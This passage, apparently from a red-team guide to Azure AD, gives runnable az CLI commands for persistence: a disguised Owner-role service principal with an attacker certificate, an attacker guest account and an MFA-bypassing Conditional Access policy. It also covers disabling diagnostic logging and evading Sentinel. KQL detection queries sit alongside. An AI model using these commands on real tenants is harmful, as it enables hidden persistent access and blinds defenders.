+# === Technique 5: Illicit Consent Grant ===
+# Malicious OAuth app tricks user into authorizing it
+# Token received does not trigger MFA at the point of API calls
+# See: Illicit Consent Grant section above
+
+# === Detection ===
+# AiTM: Sign-in from new device/location immediately after MFA success
+# Legacy: Sign-in with ClientAppUsed = "IMAP4" / "POP3" / "SMTP"
+SigninLogs
+| where ClientAppUsed in ("IMAP4", "POP3", "SMTP", "Other clients")
+| where ResultType == 0</code></pre>
+
+        <h2>Persistence in Azure AD</h2>
+        <p>Azure persistence mechanisms survive credential resets, user disablement, and even full on-prem domain compromises in hybrid environments. Service principals with certificate credentials, malicious OAuth applications, and backdoored Conditional Access policies are the most durable persistence techniques.</p>
+        <pre><code># === 1. Service Principal / App Registration Backdoor ===
+# Create a new app and assign it privileged roles
+az ad app create --display-name "AzureMonitorService"
+az ad sp create --id &lt;AppID>
+az role assignment create --assignee &lt;SP-ObjectID> --role Owner \
+  --scope /subscriptions/&lt;sub-id>
+
+# Add a certificate credential (more stealthy than client secret — no expiry warning)
+az ad app credential reset --id &lt;AppID> --cert @./attacker.pem --append
+
+# Authenticate silently with the SP
+az login --service-principal -u &lt;app-id> -p &lt;secret-or-cert> --tenant &lt;tenant-id>
+
+# === 2. Malicious Conditional Access Policy ===
+# With Global Admin or Conditional Access Admin, create a policy that:
+# - Excludes attacker-controlled accounts from MFA
+# - Whitelists attacker's IP range as a trusted location
+# - Allows legacy authentication protocols
+
+# Example backdoored CA policy JSON (appears legitimate):
+# &#123;
+#   "conditions": &#123;
+#     "locations": &#123;"include": ["trusted-location-id"], "exclude": ["attacker-ip-range"]&#125;,
+#     "clientAppTypes": ["browser", "mobileAppsAndDesktopClients"]
+#   &#125;,
+#   "grantControls": &#123;"operator": "OR", "builtInControls": ["mfa"]&#125;
+# &#125;
+# The exclude entry silently allows attacker IP range without MFA
+
+# === 3. Guest Account Persistence ===
+# Invite attacker-controlled external account as guest
+az ad invitation create \
+  --invited-user-email-address attacker@malicious.com \
+  --invite-redirect-url https://myapps.microsoft.com
+
+# Assign role to guest
+az role assignment create --assignee attacker@malicious.com --role Reader \
+  --scope /subscriptions/&lt;sub-id>
+
+# === Detection ===
+AuditLogs
+| where ActivityDisplayName == "Update conditional access policy"
+| project ActivityDateTime, InitiatedBy, TargetResources, Result
+
+AuditLogs
+| where ActivityDisplayName == "Add application"
+| where TimeGenerated > ago(7d)</code></pre>
+
+        <h2>Detection Evasion in Azure</h2>
+        <p>Azure Sentinel (Microsoft Defender XDR) correlates logs from Azure AD, M365, and third-party sources. Red team operators evade detection by blending with legitimate traffic patterns, using living-off-the-land Azure tooling, and manipulating diagnostic settings that feed Sentinel.</p>
+        <pre><code># === Evasion Techniques ===
+
+# 1. Low-and-slow operations
+# Spread actions over long intervals (one privilege escalation per hour)
+# Avoid burst activity patterns that trigger behavioral analytics
+
+# 2. Living-off-the-land (LOLBins / LOLCloud)
+# Use only legitimate Microsoft tools to blend in:
+az, az cli commands       # native Azure CLI
+AzureAD PowerShell module # same as IT admin tooling
+Microsoft Graph API       # standard REST interface
+
+# 3. Tamper with Diagnostic Settings (disable log forwarding to Sentinel)
+# Requires Contributor or Owner on the resource
+az monitor diagnostic-settings delete \
+  --name &lt;settings-name> \
+  --resource &lt;resource-id>
+
+# Check what's being monitored
+az monitor diagnostic-settings list --resource &lt;resource-id>
+
+# 4. Use service principal tokens instead of user tokens
+# SPN-based activity is less likely to trigger user-centric behavioral alerts
+# Use AADInternals or az login --service-principal
+
+# 5. Time-based evasion
+# Execute actions during low-visibility periods:
+# - Weekends / holidays
+# - Outside of monitored hours (e.g., midnight UTC)
+
+# 6. Avoid write operations during recon
+# Graph API reads are lower noise than POST/PUT/DELETE
+# Focus passive reads: GET /users, GET /groups, GET /directoryRoles
+
+# === Blue Team Countermeasures ===
+# Alert on disabled diagnostic settings:
+AzureActivity
+| where OperationName contains "Delete diagnosticSettings"
+
+# UEBA — anomalous behavior detection (even for slow attacks)
+# Custom KQL analytics rules for specific IOCs:
+AzureActivity
+| where OperationName == "Create role assignment"
+| where TimeGenerated > ago(1d)
+
+# Canary resources — fake Key Vault with logging enabled
+# Any access to canary secrets triggers high-fidelity alert</code></pre>
